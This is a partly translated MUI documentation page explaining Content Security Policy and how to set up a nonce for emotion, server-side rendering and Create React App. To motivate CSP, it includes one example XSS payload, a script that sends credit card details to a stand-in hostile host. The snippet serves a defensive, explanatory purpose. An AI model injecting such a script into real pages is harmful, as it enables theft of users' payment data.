# 内容安全策略（CSP）

<p class="description">本节介绍了建立 CSP 的详细信息。</p>

## 什么是 CSP，为什么它有用？

CSP 通过要求开发人员检索其资产的来源并将其列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的头部（heade）返回。 例如，假设您有一个托管在 `https://example.com` 的网站 CSP 头部 `default-src：'self';` 将仅加载 `https://example.com/*` 的所有资源，并否认所有其他人。 如果您的网站的某个部分容易受到 XSS 的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

此漏洞允许攻击者执行任何操作。 但是，若使用安全的 CSP 头部，浏览器将不会加载此脚本。

您可以在 [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 阅读有关 CSP 的更多信息。

## 如何实现CSP？

### 服务端渲染（SSR）

To use CSP with MUI (and emotion), you need to use a nonce. 随机数是一个随机生成的字符串，只使用一次，因此您需要添加服务器中间件以在每个请求上生成一个。

CSP nonce 是一个 Base 64 编码的字符串。 你可以生成这样一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

你必须使用 UUID 4，因为它可以生成一个 **不可预测** 的字符串。 接下来您可以将此随机数应用于 CSP 头部。 应用了随机数时，CSP 头部可能看起来像这样：

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tags on the server.

```jsx
<style
  data-emotion={`${style.key} ${style.ids.join(' ')}`}
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: style.css }}
/>
```

Then, you must pass this nonce to the emotion cache so it can add it to subsequent `<style>`.

> Note, if you were using `StyledEngineProvider` with `injectFirst`, you will need to replace it with `CacheProvider` from emotion and add the `prepend: true` option.

```js
const cache = createCache({
  key: 'my-prefix-key',
  nonce: nonce,
  prepend: true,
});

function App(props) {
  return (
    <CacheProvider value={cache}>
      <Home />
    </CacheProvider>
  );
}
```

### Create React App (CRA)

According to the [Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), a Create React App will dynamically embed the runtime script into index.html during the production build by default. This will require a new hash to be set in your CSP during each deployment.

To use a CSP with a project initialized as a Create React App, you will need to set the `INLINE_RUNTIME_CHUNK=false` variable in the `.env` file used for your production build. This will import the runtime script as usual instead of embedding it, avoiding the need to set a new hash during each deployment.

### styled-components

The configuration of the nonce is not straightforward, but you can follow [this issue](https://github.com/styled-components/styled-components/issues/2363) for more insights.
